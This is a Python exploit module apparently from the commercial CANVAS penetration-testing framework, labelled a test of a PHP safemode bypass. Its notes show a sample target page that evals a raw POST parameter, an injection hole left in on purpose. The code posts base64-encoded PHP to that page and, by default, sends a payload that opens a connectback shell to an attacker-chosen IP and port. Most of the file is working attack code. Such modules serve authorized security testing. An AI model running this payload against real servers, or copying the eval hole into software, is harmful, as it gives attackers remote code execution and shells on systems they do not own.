#! /usr/bin/env python
"""
test_safemode_bypass 
Used to test the PHP safemode bypass against our sample target
"""
# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2008
# http://www.immunityinc.com/CANVAS/ for more information
#

import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from ExploitTypes.php_multi import *

import libs.spkproxy as spkproxy
import canvasengine
import urllib
import re
import time 

NAME="php_safemode_bypass_test"
DESCRIPTION="Test module for the PHP safemode bypass"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="PHP"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION['CVE Name'] = 'N/A'
DOCUMENTATION['CVE Url'] = ''
DOCUMENTATION['References'] = ['http://www.suspekt.org/2009/08/12/state-of-the-art-post-exploitation-in-hardened-php-environments/']
DOCUMENTATION['Date public']='10/23/2009'

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""
[root@devbox ~]# php -v
PHP 5.3.0 (cli) (built: Sep 14 2009 19:11:23) (DEBUG)
Copyright (c) 1997-2009 The PHP Group
Zend Engine v2.3.0, Copyright (c) 1998-2009 Zend Technologies
[root@devbox ~]# uname -a
Linux devbox 2.6.29.4-167.fc11.i586 #1 SMP Wed May 27 17:14:37 EDT 2009 i686 i686 i386 GNU/Linux
[root@devbox ~]# cat /etc/issue
Fedora release 11 (Leonidas)
Kernel \r on an \m (\l)

[root@devbox ~]# cat /var/www/html/canvas.php
HI
<?
//print($_POST['exploit']);

if(isset($_POST['exploit']))
{
        eval($_POST['exploit']);
}
?>


"""


class theexploit(php_multi):
    """
    Exploit used for testing the php safemode bypass
    """
    def __init__(self):
        php_multi.__init__(self)
        self.port=80
        self.host=""
        self.setVersions()
        self.version=0
        self.done=0
        self.ssl=""
        self.name=NAME
        self.basepath="/"
        self.basepaths=["/"]
        self.command=None 
        self.basicauth_user=""
        self.basicauth_password=""
        self.user=""
        self.password=""
        self.hostname=None
        self.verb="POST"
        self.content_type="text/plain"
        self.targetpath="canvas.php"
        self.foundstrings=["HI"]
        self.testfile="canvas.php"

        return 

    def request1(self):
        self.log("[+] Sending Exploit")
        if self.command:
            self.log("[+] Command: %s"%self.command)
            command=self.command
            command=self.encode_php(command).strip()

            fields={}
            fields["exploit"]="eval(base64_decode("+command +"));"
            data = self.UA.POST(self.targetpath, fields) 
            #self.log("Data=%s"%data)

            self.log("Command result=%s"%prettyprint(data))
            ret = 1
        else:
            command=self.get_php_to_mosdef()
            command=b64encode(command).strip()
            command=self.encode_php(command)
            #self.log("[+] Command: %s"%command)

            fields={}
            exploitstring="eval(base64_decode("+command+"));"
            self.log("[+] Exploit string: %s"%exploitstring)
            fields["exploit"]=exploitstring
            self.UA.POST(self.targetpath, fields, noresponse=True )
            self.log("Sent attack request...")
            self.log("[+] Looking for PHP connectback")
            time.sleep(5)
            ret=self.ISucceeded()

        return ret

    def usage(self):
        print "Example: "+sys.argv[0]+" -t 172.16.104.128 -p 80 -O user:temp -O password:password -l 10.10.10.227 -d 9898"
        print "-t <target ip>"
        print "-p <target port>			     [optional]"
        print "-O basepath: /path/to/smf/      [optional]"
        print "-O hostname: target vhost       [optional]"
        print "-O command:commandtorun         [optional]"
        print "-O user: forum username"
        print "-O password: forum password"
        print "-l call back ip if doing connect back"
        print "-d listening port for call back"
        return

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
